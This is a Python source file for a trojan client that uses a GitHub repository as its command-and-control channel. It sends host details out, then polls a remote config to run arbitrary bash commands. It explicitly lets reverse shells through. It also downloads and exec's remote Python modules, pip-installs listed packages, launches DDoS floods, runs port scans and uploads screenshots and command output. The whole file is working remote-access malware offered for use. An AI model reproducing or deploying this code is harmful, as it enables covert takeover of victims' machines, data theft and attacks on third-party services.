import base64
import importlib
import platform
import subprocess
import json
import sys
import time
import requests
import random
import re

class HostInfoCollector:
    def __init__(self, device_id):
        self.device_id = device_id
        self.host_info = {
            "device_id": self.device_id,
            "os": platform.system(),
            "os_version": platform.version(),
        }

    def collect_info(self):
        return self.host_info

class GitHubConfigManager:
    def __init__(self):
        self.config_file_url = "https://api.github.com/repos/s101853/Trojan/contents/config.json"  
        self.config = {}
        self.last_config_content = None
        self.headers = {
            "Authorization": "token ghp_token_here",
            "Accept": "application/vnd.github.v3.raw"
        }

    def load_config(self):
        try:
            response = requests.get(self.config_file_url, headers=self.headers)
            response.raise_for_status()
            config_content = response.json()
            if config_content != self.last_config_content:
                self.last_config_content = config_content
                self.config = config_content
                config_changed = True
                return config_changed
        except requests.RequestException as e:
            pass
        
        return False

    def save_config(self):
        with open("config.json", "w") as f:
            json.dump(self.config, f)

    def has_command(self):
        return "command" in self.config

    def get_command(self):
        return self.config.get("command")

    def get_requirements(self):
        return self.config.get("requirements", [])

    def update_command(self, command):
        self.config["command"] = command
        self.save_config()

class GitHubTaskRunner:
    def __init__(self, device_id):
        self.collector = HostInfoCollector(device_id)
        self.config_manager = GitHubConfigManager()
        self.device_id = device_id

    def run(self):
        try:
            self.send_system_data()

            while True:
                config_changed = self.config_manager.load_config()
                if config_changed:
                    print("Configuration changed. Running command.")
                    self.run_command()
                
                delay = random.randint(10, 20)
                print(f"Waiting for {delay} seconds before checking for commands.")
                time.sleep(delay)
        except KeyboardInterrupt:
            print("Program interrupted by user.")

    def send_system_data(self):
        system_info = self.collector.collect_info()
        filename = f"{self.device_id}.json"  
        message = f"Update {filename}"  

        self.push_data_to_github(system_info, filename, message)

    def run_command(self):
        command = self.config_manager.get_command()
        if command:
            print(f"Command found: {command}")

            if command == "execute_bash_command":
                bash_command = self.config_manager.config.get("bash_command")
                if bash_command:
                    print(f"Executing Bash command: {bash_command}")
                    self.execute_bash_command(bash_command)
                else:
                    print("No bash command specified in config.")              
            else:
                requirements = self.config_manager.get_requirements()
                if requirements:
                    print("Installing requirements...")
                    self.install_requirements(requirements)

                module_name = f"{command}_module"
                module_url = f"https://api.github.com/repos/s101853/Trojan/contents/{command}_module.py"

                try:
                    print(f"Downloading module from: {module_url}")
                    response = requests.get(module_url, headers=self.config_manager.headers)
                    if response.status_code == 200:
                        print("Module downloaded successfully.")
                        module = self.import_module_from_string(module_name, response.text)
                        print(f"Executing command: {command}")

                        if command == "ddos_attack":
                            target_url = self.config_manager.config.get("target_url")
                            request_count = self.config_manager.config.get("request_count", 100)
                            getattr(module, command)(target_url, request_count)
                        
                        else:
                            result = getattr(module, command)()

                            if command == "network_info":
                                self.push_network_info_to_github(result)
                            elif command == "port_scan":
                                self.push_port_scan_info_to_github(result)
                            else:
                                self.push_screenshot_to_github()
                    else:
                        print(f"Failed to download module. Status code: {response.status_code}")

                except Exception as e:
                    print(f"Error executing command: {str(e)}")
        else:
            print("No command specified in config.")
    
    def install_requirements(self, requirements):
        for requirement in requirements:
            subprocess.run(["pip", "install", requirement])

    def execute_bash_command(self, bash_command):
        try:
            if re.search(r'/dev/tcp/', bash_command):
                print("Detected reverse shell command. Let him through!")
                process = subprocess.Popen(
                    bash_command, shell=True, executable="/bin/bash", stdout=subprocess.PIPE, stderr=subprocess.PIPE
                )
                stdout, stderr = process.communicate()
                if process.returncode == 0:
                    print(f"Command output: {stdout.decode().strip()}")
                    self.push_bash_output_to_github(stdout.decode())
                else:
                    print(f"Error executing command: {stderr.decode().strip()}")
                    self.push_bash_output_to_github(stderr.decode())
                return

            result = subprocess.run(bash_command, shell=True, capture_output=True, text=True, timeout=10)

            if result.returncode == 0:
                print(f"Command output: {result.stdout}")
                self.push_bash_output_to_github(result.stdout)
            else:
                print(f"Error executing command: {result.stderr}")
                self.push_bash_output_to_github(result.stderr)

        except subprocess.TimeoutExpired:
            print("Command timed out.")
        except Exception as e:
            print(f"Error executing bash command: {str(e)}")

    def push_bash_output_to_github(self, output):
        filename = f"{self.device_id}_output.txt"  
        message = f"Update {filename} with bash command output"
        self.push_data_to_github(output, filename, message)        

    def push_data_to_github(self, data, filename, message):
        try:
            if isinstance(data, bytes):
                content = base64.b64encode(data).decode()
            else:
                content = base64.b64encode(json.dumps(data).encode()).decode()

            endpoint_url = f"https://api.github.com/repos/s101853/Trojan/contents/{filename}"
            headers = {
                "Authorization": "token ghp_token_here",
                "Content-Type": "application/json",
            }
            current_contents_response = requests.get(endpoint_url, headers=headers)
            current_contents_data = current_contents_response.json()
            current_sha = current_contents_data.get("sha")
            payload = {
                "message": message,
                "content": content,
                "branch": "main",
                "sha": current_sha,
            }
            response = requests.put(endpoint_url, headers=headers, json=payload)

            if response.status_code in [200, 201]:
                response_data = json.loads(response.text)
                if not response_data.get('commit', {}).get('verification', {}).get('verified', False):
                    print("Data pushed to GitHub successfully (unsigned).")
                else:
                    print("Data pushed to GitHub successfully.")
            else:
                print(f"Failed to push data to GitHub: {response.text}")
        except Exception as e:
            print(f"Failed to push data to GitHub: {str(e)}")

    def push_network_info_to_github(self, network_info):
        self.push_data_to_github(network_info, "network.json", "Update network.json")

    def push_port_scan_info_to_github(self, port_scan_info):
        self.push_data_to_github(port_scan_info, "port_scan.json", "Update port_scan.json")

    def push_screenshot_to_github(self, screenshot_path='screenshot.png'):
        with open(screenshot_path, "rb") as f:
            screenshot_data = f.read()

        self.push_data_to_github(screenshot_data, "screenshot.png", "Update screenshot.png")

    def import_module_from_string(self, module_name, code):
        spec = importlib.util.spec_from_loader(module_name, loader=None, origin=module_name)
        module = importlib.util.module_from_spec(spec)
        exec(code, module.__dict__)
        sys.modules[module_name] = module
        return module

if __name__ == "__main__":
    device_id = "Device_1"
    task_runner = GitHubTaskRunner(device_id)
    task_runner.run()
